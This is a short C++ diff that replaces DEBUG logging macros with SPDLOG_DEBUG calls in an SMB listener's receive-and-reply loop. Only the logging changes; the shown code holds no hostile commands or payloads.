@@ -42,7 +42,7 @@ void ListenerSmb::lauchSmbServ()
 
 			m_serverSmb->initServer();
 
-			DEBUG("receiving");
+			SPDLOG_DEBUG("receiving");
 	
 			bool res = false;
 			string input;
@@ -52,19 +52,19 @@ void ListenerSmb::lauchSmbServ()
 				std::this_thread::sleep_for(std::chrono::milliseconds(50));		
 			}
 
-			DEBUG("received input.size " << std::to_string(input.size()));
+			SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
 
 			if(res && !input.empty())
 			{
 				string output;
 				bool ret = handleMessages(input, output);
 
-				DEBUG("sending output.size " << std::to_string(output.size()));
+				SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
 
 				res = m_serverSmb->sendData(output);	
 				if(res)
 				{
-					DEBUG("sent");
+					SPDLOG_DEBUG("sent");
 				}
 			}
 		}
